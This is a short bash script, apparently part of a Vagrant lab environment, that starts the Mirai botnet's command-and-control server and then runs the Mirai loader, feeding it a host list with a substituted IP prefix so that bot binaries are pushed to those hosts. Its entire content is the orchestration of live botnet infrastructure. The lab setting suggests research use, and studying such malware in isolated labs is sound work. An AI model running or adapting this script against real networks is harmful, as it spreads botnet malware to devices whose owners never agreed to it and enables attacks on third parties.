#!/usr/bin/env bash

echo ">>> Starting cnc..."
killall cnc || true
duende /vagrant/mirai/release/cnc

echo ">>> Startig loader..."
cd /vagrant/mirai/loader
cp /vagrant/configs/hosts.txt /vagrant/mirai/loader/bins/
sed -i "s|{ip_prx}|$ip_prx|g;" /vagrant/mirai/loader/bins/hosts.txt
./reports /vagrant/mirai/loader/bins/hosts.txt | ./loader
